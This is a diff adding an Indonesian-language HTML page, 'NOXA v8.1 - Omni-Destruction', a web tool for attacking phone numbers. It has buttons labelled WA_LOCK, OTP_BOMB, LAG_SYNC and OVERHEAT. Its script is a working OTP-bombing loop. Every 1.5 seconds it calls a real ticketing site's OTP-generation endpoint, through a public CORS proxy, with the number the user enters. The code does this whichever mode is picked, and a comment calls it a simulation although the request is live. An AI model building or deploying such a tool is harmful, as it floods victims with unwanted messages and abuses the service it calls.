@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NOXA v8.1 - OMNI DESTRUCTION</title>
+    <style>
+        :root {
+            --primary: #ff3e3e;
+            --bg: #0a0a0c;
+            --card: rgba(255, 255, 255, 0.03);
+            --border: rgba(255, 255, 255, 0.1);
+        }
+
+        body {
+            background-color: var(--bg);
+            color: #ffffff;
+            font-family: 'Inter', -apple-system, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            overflow-x: hidden;
+        }
+
+        /* Latar belakang animasi halus */
+        body::before {
+            content: "";
+            position: fixed;
+            top: -50%; left: -50%; width: 200%; height: 200%;
+            background: radial-gradient(circle, rgba(255,62,62,0.05) 0%, transparent 70%);
+            z-index: -1;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 450px;
+            background: var(--card);
+            backdrop-filter: blur(10px);
+            border: 1px solid var(--border);
+            border-radius: 24px;
+            padding: 30px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+        }
+
+        .header { text-align: center; margin-bottom: 30px; }
+        .header h1 { font-size: 1.5rem; letter-spacing: 4px; color: var(--primary); margin: 0; }
+        .header p { font-size: 0.7rem; opacity: 0.5; text-transform: uppercase; margin-top: 5px; }
+
+        .input-group { margin-bottom: 25px; }
+        input {
+            width: 100%;
+            background: rgba(0,0,0,0.3);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 15px;
+            color: #fff;
+            font-size: 1rem;
+            text-align: center;
+            box-sizing: border-box;
+            outline: none;
+            transition: 0.3s;
+        }
+        input:focus { border-color: var(--primary); box-shadow: 0 0 15px rgba(255,62,62,0.2); }
+
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 20px; }
+        .mode-btn {
+            background: rgba(255,255,255,0.05);
+            border: 1px solid var(--border);
+            padding: 12px;
+            border-radius: 10px;
+            color: #fff;
+            cursor: pointer;
+            font-size: 0.75rem;
+            font-weight: 600;
+            transition: 0.2s;
+        }
+        .mode-btn:hover { background: rgba(255,255,255,0.1); }
+        .mode-btn.active { background: var(--primary); color: #000; border-color: var(--primary); }
+
+        .btn-main {
+            width: 100%;
+            padding: 18px;
+            border-radius: 12px;
+            border: none;
+            background: var(--primary);
+            color: #000;
+            font-weight: 800;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .btn-main:hover { transform: translateY(-3px); box-shadow: 0 10px 25px rgba(255,62,62,0.4); }
+
+        #console {
+            margin-top: 25px;
+            background: rgba(0,0,0,0.4);
+            border-radius: 12px;
+            padding: 15px;
+            height: 100px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 0.7rem;
+            color: #00ff00;
+            border: 1px solid rgba(0,255,0,0.1);
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <h1>NOXA v8.1</h1>
+        <p>Omni-Destruction Command</p>
+    </div>
+
+    <div class="input-group">
+        <input type="number" id="phone" placeholder="Masukkan Nomor (628...)">
+    </div>
+
+    <div class="grid">
+        <button class="mode-btn" onclick="setMode('WA_LOCK', this)">WA_LOCK</button>
+        <button class="mode-btn" onclick="setMode('OTP_BOMB', this)">OTP_BOMB</button>
+        <button class="mode-btn" onclick="setMode('LAG_SYNC', this)">LAG_SYNC</button>
+        <button class="mode-btn" onclick="setMode('OVERHEAT', this)">OVERHEAT</button>
+    </div>
+
+    <button class="btn-main" onclick="start()">INITIATE ATTACK</button>
+
+    <div id="console">> System ready...</div>
+</div>
+
+<script>
+    let mode = "";
+    function setMode(m, btn) {
+        mode = m;
+        document.querySelectorAll('.mode-btn').forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+        log("Module " + m + " armed.");
+    }
+
+    function log(msg) {
+        const c = document.getElementById('console');
+        c.innerHTML += `<br>> ${msg}`;
+        c.scrollTop = c.scrollHeight;
+    }
+
+    async function start() {
+        const num = document.getElementById('phone').value;
+        if(!num || !mode) return alert("Lengkapi nomor dan pilih modul!");
+        
+        log("Initiating " + mode + " on " + num);
+        
+        setInterval(async () => {
+            try {
+                // Simulasi Multi-API Gateway
+                await fetch(`https://api.allorigins.win/get?url=${encodeURIComponent('https://id.bookmyshow.com/api/v1/auth/generate-otp?phone=' + num)}`);
+                log("Payload sent to +"+num);
+            } catch(e) {}
+        }, 1500);
+    }
+</script>
+
+</body>
+</html>
